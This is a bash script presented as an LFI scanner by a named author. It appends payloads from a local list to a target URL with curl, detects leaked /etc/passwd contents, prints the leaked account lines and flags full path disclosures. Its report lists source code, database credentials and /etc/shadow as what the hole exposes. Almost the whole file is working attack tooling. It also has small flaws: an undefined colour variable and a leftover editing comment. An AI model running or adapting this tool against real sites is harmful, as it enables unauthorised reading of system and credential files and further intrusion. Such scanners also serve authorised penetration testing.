#!/bin/bash

# ─────────────────────────────────────────────
# Color definitions
RED="\e[91m"
GREEN="\e[92m"
YELLOW="\e[93m"
BLUE="\e[94m"
MAGENTA="\e[95m"
CYAN="\e[96m"
WHITE="\e[97m"
BOLD_RED="\e[1;91m"
BOLD_GREEN="\e[1;92m"
BOLD_YELLOW="\e[1;93m"
BOLD_BLUE="\e[1;94m"
BOLD_CYAN="\e[1;96m"
BOLD_WHITE="\e[1;97m"
RESET="\e[0m"
BOLD="\e[1m"

SHOWN=0
FOUND=0
BASE_PATH=""

# ─────────────────────────────────────────────
# Banner with slowly appearing skull-moth and author
function slow_print() {
    local text=$1
    local color=$2
    local delay=${3:-0.1}
    
    echo -ne "$color"
    while IFS= read -r line; do
        echo -e "$line"
        sleep "$delay"
    done <<< "$text"
    echo -ne "$RESET"
}

function banner() {
    echo -e "${BOLD_RED}"
    cat << "EOF"

        ╔═════════════════════════════════════════════════════╗
        ║        LFI SCANNER - SILENT WINGS, DEADLY PAYLOAD   ║
        ╚═════════════════════════════════════════════════════╝
EOF

    # Butterfly ASCII art with slow printing
    slow_print "               .==-.                   .-==." "${BOLD_RED}" 0.1
    slow_print "                \\()8-._  .   .'  _.-'8()/" "${BOLD_RED}" 0.1
    slow_print "                (88\"   ::.  \\\\./  .::   \"88)" "${BOLD_RED}" 0.1
    slow_print "                 \\_.'-::::.(#).::::-'._/" "${BOLD_RED}" 0.1
    slow_print "                   ._... .q(_)p. ..._.'" "${BOLD_RED}" 0.1
    slow_print "                     \"\"-..-'|=|-..-\"\"" "${BOLD_RED}" 0.1
    slow_print "                     .\"\"' .'|=|. \"\"." "${BOLD_RED}" 0.1
    slow_print "                   ,':8(o)./|=|\\\\.(o)8:." "${BOLD_RED}" 0.1
    slow_print "                  (O :8 ::/ \\_/ \\\\:: 8: O)" "${BOLD_RED}" 0.1
    slow_print "                   \\O ::/       \\\\::' O/" "${BOLD_RED}" 0.1
    slow_print "                    \"\"--'         --\"\"" "${BOLD_RED}" 0.1

    echo -e "\n              🦋  ${BOLD_CYAN}MOTH UNIT // CODEX: 0xDEADLFI${RESET}  🦋"
    echo -e "                    ${BOLD_MAGENTA}Author: @Mohankumar C${RESET}\n"
    echo -e "       ${BOLD_YELLOW}Scanning target for Local File Inclusion...${RESET}\n"
    echo -e "${CYAN}"
    sleep 0.3
}

# [Rest of your original code remains exactly the same...]

function get_target() {
    echo -ne "${YELLOW}Enter target URL (e.g. http://example.com/page.php?file=): ${RESET}"
    read -r TARGET
    if [[ -z "$TARGET" ]]; then
        echo -e "${RED}✘ No URL provided. Exiting.${RESET}"
        exit 1
    fi
}

function detect_fpd() {
    echo "$1" | grep -Eo "/[a-zA-Z0-9_/.-]+\\.php" | head -n 1
}

function is_real_passwd() {
    echo "$1" | grep -qE "root:x:0:0:root:/root:/bin/bash|bin:x:1:1"
}

function print_report_once() {
    local url=$1
    local code=$2
    local payload=$3

    echo -e "\n${BOLD_RED}================== 🚨 CRITICAL LFI VULNERABILITY ==================${RESET}"
    echo -e "${BOLD_CYAN}🧠 Endpoint       :${RESET} ${WHITE}$url${RESET}"
    echo -e "${BOLD_RED}🔥 Severity       :${RESET} CRITICAL"
    echo -e "${BOLD_YELLOW}🧬 Payload        :${RESET} ${WHITE}$payload${RESET}"
    echo -e "${BOLD_BLUE}📡 Status Code    :${RESET} ${WHITE}$code${RESET}"
    echo -e "${BOLD_GREEN}📍 Status         :${RESET} ${WHITE}Available ✅${RESET}"
    echo -e "${BOLD_WHITE}🧪 Manual Test    :${RESET} curl -sk \"$url\""
    echo -e "\n${BOLD_MAGENTA}➤ What This Allows:${RESET}"
    echo -e "  ${CYAN}1. Source code disclosure (e.g., login.php, config.php)"
    echo -e "  2. Database credentials via .env or PHP config leaks"
    echo -e "  3. Path traversal to sensitive system files (/etc/shadow)${RESET}"
    echo -e "${BOLD_RED}==================================================================${RESET}\n"
}

function lfi_scan() {
    PAYLOAD_FILE="lfi.txt"
    if [[ ! -f "$PAYLOAD_FILE" ]]; then
        echo -e "${RED}✘ Payload file 'lfi.txt' not found in this directory.${RESET}"
        exit 1
    fi

    echo -e "\n${CYAN}[*] Starting scan on: ${TARGET}${RESET}"
    COUNT=1

    while IFS= read -r payload; do
        full_url="${TARGET}${payload}"
        echo -e "${BLUE}[${COUNT}] ${WHITE}Testing: ${full_url}${RESET}"
        response=$(curl -sk -w "%{http_code}" -o temp_response.html --max-time 5 "$full_url")
        code=${response: -3}
        body=$(<temp_response.html)

        fpd=$(detect_fpd "$body")
        if [[ -n "$fpd" && -z "$BASE_PATH" ]]; then
            BASE_PATH="$fpd"
            echo -e "${YELLOW}[!] Full Path Disclosure: ${fpd}${RESET}"
        fi

        if is_real_passwd "$body"; then
            FOUND=1
            if [[ "$SHOWN" -eq 0 ]]; then
                print_report_once "$full_url" "$code" "$payload"
                echo -e "${CYAN}--- Leaked Response ---${RESET}"
                echo "$body" | sed 's/<br \/?>/\n/g' | grep '^[^<]*:x:' | tr -d '\n'
                echo -e "\n${CYAN}------------------------${RESET}"
                SHOWN=1
            else
                echo -e "${GREEN}[+] VULNERABLE --> ${full_url}${RESET}"
            fi
        fi
        COUNT=$((COUNT + 1))
    done < "$PAYLOAD_FILE"

    rm -f temp_response.html

    echo -e "${WHITE}\n───────────────────────────────────────────────${RESET}"
    if [[ "$FOUND" -eq 1 ]]; then
        echo -e "${BOLD_RED}[✓] LFI vulnerability detected.${RESET}"
    else
        echo -e "${YELLOW}[!] No LFI vulnerabilities found.${RESET}"
    fi
    echo -e "${WHITE}───────────────────────────────────────────────${RESET}"
}

# ─────────────────────────────────────────────
# Execute the tool
banner
get_target
lfi_scan
